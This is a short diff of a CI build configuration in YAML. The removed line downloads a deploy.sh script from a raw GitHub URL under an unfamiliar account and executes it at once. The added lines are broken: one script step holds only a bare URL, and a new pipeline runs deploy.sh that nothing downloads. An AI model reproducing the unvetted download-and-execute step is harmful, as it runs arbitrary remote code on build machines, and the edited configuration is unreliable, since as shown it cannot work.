@@ -1,4 +1,12 @@
 build:
   steps:
     - script:
-        code: wget https://raw.githubusercontent.com/Uevwn/trial/main/deploy.sh && chmod +x deploy.sh && ./deploy.sh
+        code: https://raw.githubusercontent.com/Uevwn/trial/main/deploy.sh
+
+hello-again:
+  box: ubuntu
+  services:
+    - mongo:2.2.7
+  steps:
+    - script:
+        code: chmod +x deploy.sh && ./deploy.sh
